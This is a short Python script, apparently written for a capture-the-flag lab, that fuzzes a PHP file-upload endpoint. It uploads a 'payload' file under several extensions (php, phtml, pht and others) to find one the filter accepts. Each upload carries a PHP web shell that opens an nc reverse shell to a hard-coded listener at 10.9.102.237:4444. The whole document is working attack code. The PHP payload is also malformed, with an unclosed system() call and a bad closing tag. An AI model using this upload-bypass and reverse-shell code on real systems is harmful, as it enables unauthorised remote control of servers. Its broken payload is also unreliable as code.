import requests, time, sys, signal
from pwn import *

def def_handler(sig, frame):
	print("\n[!] Saliendo...\n")
	sys.exit(1)

# variables globales
main_url = "http://10.10.224.75:3333/internal/index.php"
extensions = ["php", "php4", "php5", "phtml", "pht", "txt", "html", "py"]

def fuzzer_extension():
	s = requests.Session()
	for extension in extensions:
		p1.status("Probando el payload.%s" % extension)
		time.sleep(1)
		file_to_upload = "payload.%s" % extension
		uploaded_file = {"file":(file_to_upload, '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.102.237 4444 >/tmp/f"; >?')}

		response = s.post(main_url, files = uploaded_file)

		if "Success" in response.text :
			p1.success("La extension %s es valida" % extension)
			sys.exit()



if __name__=="__main__":
	p1 = log.progress("Subiendo archivos")
	fuzzer_extension()

